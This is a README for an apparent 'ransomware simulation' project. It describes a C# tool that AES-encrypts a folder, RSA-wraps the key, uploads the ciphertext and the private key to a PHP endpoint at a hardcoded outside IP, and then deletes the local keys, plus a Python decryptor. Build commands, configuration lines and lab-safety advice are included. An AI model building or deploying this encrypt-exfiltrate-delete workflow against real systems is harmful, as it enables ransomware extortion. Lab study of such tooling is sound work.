Project structure (as provided)
ransomware-simulation/
├── decrypterForLinux.py        # Python decryption tool (Linux)
├── ransomware.cs               # C# encryption tool (console)
├── scriptForDocxFile.sh        # Bash DOCX fixer (extract & rezip)
└── server.php                  # Simple PHP upload endpoint

High-level workflow

ransomware.cs — encrypts files with AES, wraps AES key using RSA, writes keys (IV, wrapped key, RSA keys) to a keys folder, optionally uploads files and keys to the server and then deletes local keys.

server.php — receives uploads (encrypted files and key files) and stores them on the server.

scriptForDocxFile.sh — helps fix ZIP‑based DOCX files that became corrupted (extract + rezip).

decrypterForLinux.py — uses privatekey.xml, aes_key.enc and aes_iv.bin (must be in same folder) to unwrap AES key with RSA and decrypt AES‑CBC data.

Files — Usage & customization (detailed)

Below each file is described with the exact places to change configuration or behavior.

ransomware.cs — C# encryptor
What it does

Scans a target folder, encrypts every file using AES‑128 CBC (PKCS7), generates RSA keypair (XML format), writes:

privatekey.xml

publickey.xml

aes_key.enc (AES key encrypted/wrapped by RSA public)

aes_iv.bin (AES IV)

Optionally uploads encrypted files and those key files to server.php.

Deletes local keys folder after upload.

How to build

Using Microsoft C# compiler (csc) on Windows:

csc -r:System.Net.Http.dll -out:encryptor.exe ransomware.cs
.\encryptor.exe


Or use dotnet (create a console project and paste the code) if preferred.

Where to customize (open ransomware.cs and edit these lines)

Target folder to encrypt:

string folderPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "ranstest");


Replace "ranstest" with your test folder name containing only sample files.

Keys directory:

string keysDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "ranstest_keys");


Change "ranstest_keys" to alternate keys location for testing.

RSA key size (if you want to change; not recommended for simulation parity):

using (var rsa = new RSACryptoServiceProvider(1024)) // change 1024 -> 2048 for stronger RSA (increase time)


Note: 1024 is small; use 2048+ for real security. For simulation keep 1024/2048 depending on needs.

AES parameters (mode/size/padding):

aes.KeySize = 128;   // change to 256 if you want AES-256 (must adjust key handling)
aes.Mode = CipherMode.CBC;
aes.Padding = PaddingMode.PKCS7;


Upload behavior / server endpoint:

string uploadUrl = "http://5.197.8.124:8888/server.php";


Replace with your server URL. To disable upload entirely, you may:

Comment out the await UploadFileAsync(fileName, keysDir); call, or

Add a boolean toggle (e.g., bool enableUpload = false;) and branch.

Files sent to server: code currently uploads encrypted files and then AES IV, privatekey.xml, publickey.xml, aes_key.enc. If you want to not upload privatekey.xml change the filesToSend array ordering/contents.

Safety recommendations

For GitHub, remove or obfuscate actual upload URL, and provide a --dry-run option that encrypts locally but does not upload or delete keys.

Never commit real private keys to public repos.

server.php — PHP upload endpoint
What it does

Accepts uploaded file via $_FILES['file'] and moves it to uploads/ within the same folder.

Where to customize (edit server.php)

Upload folder path:

$uploadDir = __DIR__ . '/uploads/';


Change to an absolute path if desired (e.g., /var/www/uploads/), and ensure the PHP process user can write to it.

Permissions created by mkdir:

mkdir($uploadDir, 0777, true);


Production recommendation: use tighter permissions (e.g., 0755) and configure server-level restrictions.

Security notes

This script is intentionally minimal. Add validation:

Limit accepted MIME types and file size.

Generate unique file names (timestamp or random token) to avoid overwrites.

Serve the endpoint over HTTPS.

Restrict access (IP whitelisting, basic auth) if used even in a lab.

scriptForDocxFile.sh — Bash DOCX fixer
What it does

Prompts for a DOCX file path.

Unzips the DOCX (DOCX is a ZIP archive of XML files).

Rezips contents into <original>_fixed.docx.

Usage
bash scriptForDocxFile.sh
# or make executable:
chmod +x scriptForDocxFile.sh
./scriptForDocxFile.sh

Where to customize (open scriptForDocxFile.sh)

Prompt text and messages to localize or change wording.

Output filename:

output_file="$file_dir/${base_name}_fixed.docx"


Change _fixed suffix if desired.

Behavior: By default it removes the temp directory. For debugging, comment out rm -rf "$temp_dir" so you can inspect extracted contents.

Notes

Useful when encryption / decryption or manual manipulation disturbed the ZIP structure of DOCX files.

Works only for ZIP-based Office files (.docx, .xlsx, .pptx).

decrypterForLinux.py — Python decryptor
What it does

Loads RSA private key from .NET XML format (privatekey.xml).

Unwraps AES key from aes_key.enc (RSA OAEP assumed).

Reads aes_iv.bin (must be 16 bytes).

Decrypts the ciphertext file (AES‑CBC, PKCS7) and writes <original>.decrypted.

Requirements

Python 3.x

PyCryptodome:

pip3 install pycryptodome

Usage

Place the following files in the same folder:

decrypted-target-file (the ciphertext file you want to decrypt)

privatekey.xml

aes_key.enc

aes_iv.bin

Run:

python3 decrypterForLinux.py


When prompted, specify the path to the encrypted file (absolute or relative). Output will be <file>.decrypted.

Where to customize (edit decrypterForLinux.py)

RSA padding: currently uses PKCS1_OAEP — change only if encryption used a different padding scheme.

AES mode/parameters: the script assumes AES-CBC; to change:

cipher = AES.new(aes_key, AES.MODE_CBC, iv)


Switch to AES.MODE_GCM only if the encryption used GCM (requires different handling).

Output filename:

out_path = os.path.join(base_dir, os.path.basename(encrypted_file_path) + ".decrypted")


Adjust suffix/prefix as necessary.

Important

privatekey.xml must be the XML produced by .NET RSACryptoServiceProvider.ToXmlString(true) (with Modulus, Exponent, D, P, Q, DP, DQ, InverseQ elements).

All files (encrypted file, privatekey.xml, aes_key.enc, aes_iv.bin) must be in the same directory for the script to find them without full paths.

Safe testing recommendations (must follow)

Always prepare a dedicated VM (snapshot before testing). Restore snapshot to revert changes.

Use only sample/test files — no personal or production data.

Use network isolation or private lab network for server uploads.

Implement a --dry-run or test mode in ransomware.cs that:

Doesn’t overwrite originals (writes .enc copies instead).

Doesn’t upload.

Doesn’t delete keys.

Keep a copy (escrow) of the AES key and IV for each test file so you can recover files — essential for lab experiments.

Example safe workflow (step‑by‑step)

Create a VM snapshot.

Put test files in the target folder (e.g., C:\Users\lab\ranstest).

Edit ransomware.cs to use that folder and set enableUpload = false (or comment out upload).

Compile & run encryptor on the VM; inspect outputs and ranstest_keys on Desktop.

If a DOCX got damaged, copy it to the VM and run scriptForDocxFile.sh to repair it.

Copy privatekey.xml, aes_key.enc, aes_iv.bin into same folder as a ciphertext file and run decrypterForLinux.py.

Compare original and decrypted file bytewise to verify correctness.

Revert the VM snapshot.
